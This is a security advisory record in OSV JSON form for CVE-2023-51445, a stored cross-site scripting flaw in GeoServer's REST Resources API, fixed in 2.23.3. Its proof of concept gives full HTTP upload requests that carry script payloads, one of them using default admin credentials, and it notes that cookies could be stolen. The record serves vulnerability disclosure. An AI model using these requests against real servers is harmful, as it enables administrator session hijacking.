{
  "schema_version": "1.4.0",
  "id": "GHSA-fh7p-5f6g-vj2w",
  "modified": "2024-03-20T21:04:09Z",
  "published": "2024-03-20T14:58:17Z",
  "aliases": [
    "CVE-2023-51445"
  ],
  "summary": "Stored Cross-Site Scripting (XSS) vulnerability in GeoServer's REST Resources API",
  "details": "### Summary\nA stored cross-site scripting (XSS) vulnerability exists that enables an authenticated administrator with workspace-level privileges to store a JavaScript payload in uploaded style/legend resources that will execute in the context of another administrator's browser when viewed in the REST Resources API.  Access to the REST Resources API is limited to full administrators by default and granting non-administrators access to this endpoint should be carefully considered as it may allow access to files containing sensitive information.\n\n### Details\nUpload a new Legend via the New Style page if user has permissions for this. This file is then not checked and is uploaded to the backend system. This file can then be viewed directly by requesting it via the API which will then view the file in its raw format without sanitisation.\n![image](https://user-images.githubusercontent.com/6471928/232732469-7dbf2776-5712-4c68-bd12-e2403c136a7c.png)\n\n![image](https://user-images.githubusercontent.com/6471928/232732832-4fe2337f-9b28-41b1-9181-24abff4a6973.png)\n\n\n### PoC\n\n1 .User makes the following request to upload file.\n```\nPOST /geoserver/web/wicket/bookmarkable/org.geoserver.wms.web.data.StyleNewPage?11-1.IBehaviorListener.0-dialog-dialog-content-form-submit&wicket-ajax=true&wicket-ajax-baseurl=wicket%2Fbookmarkable%2Forg.geoserver.wms.web.data.StyleNewPage%3F11 HTTP/1.1\nHost: geoserver:8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------37957706701641834739220342753\nContent-Length: 619\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n-----------------------------37957706701641834739220342753\nContent-Disposition: form-data; name=\"id89_hf_0\"\n-----------------------------37957706701641834739220342753\nContent-Disposition: form-data; name=\"userPanel:image\"\n-----------------------------37957706701641834739220342753\nContent-Disposition: form-data; name=\"userPanel:upload\"; filename=\"test.html\"\nContent-Type: text/html\n<script>alert(document.cookie)</script>\n-----------------------------37957706701641834739220342753\nContent-Disposition: form-data; name=\"p::submit\"\n1\n-----------------------------37957706701641834739220342753--\n```\n2. File is uploaded to the backend system and is viewable via the API at - /geoserver/rest/resourse/styles as per the screenshot above.\n\n3. If admin user views this file the Javascript is executed and this could be used to craft a payload to steal the user's cookies(as these do not currently use HTTPOnly)\n![image](https://user-images.githubusercontent.com/6471928/232733694-5a994b08-53e4-4cd0-a20e-ec8717537e26.png)\n\nAlternatively -\n\nIf the user has permissions to use the API to make PUT requests then they can directly upload malicious files as per a request below. This would be viewable in the same way as above.\n\nPUT /geoserver/rest/resource/styles/test2.html HTTP/1.1\nHost: geoserver:8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nAuthorization: Basic YWRtaW46Z2Vvc2VydmVy (admin:geoserver default credentials)\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: text/html\nContent-Length: 29\n\n<script>alert(1)</script>\n\n\n### Impact\nIf an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:\n\n1 .Perform any action within the application that the user can perform.\n2. View any information that the user is able to view.\n3. Modify any information that the user is able to modify.\n4. Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.\n\n### References\nhttps://osgeo-org.atlassian.net/browse/GEOS-11148\nhttps://github.com/geoserver/geoserver/pull/7161\n",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "Maven",
        "name": "org.geoserver:gs-restconfig"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.23.3"
            }
          ]
        }
      ]
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/geoserver/geoserver/security/advisories/GHSA-fh7p-5f6g-vj2w"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-51445"
    },
    {
      "type": "WEB",
      "url": "https://github.com/geoserver/geoserver/pull/7161"
    },
    {
      "type": "WEB",
      "url": "https://github.com/geoserver/geoserver/commit/7db985738ff2422019ccac974cf547bae5770cad"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/geoserver/geoserver"
    },
    {
      "type": "WEB",
      "url": "https://osgeo-org.atlassian.net/browse/GEOS-11148"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-79"
    ],
    "severity": "MODERATE",
    "github_reviewed": true,
    "github_reviewed_at": "2024-03-20T14:58:17Z",
    "nvd_published_at": "2024-03-20T16:15:07Z"
  }
}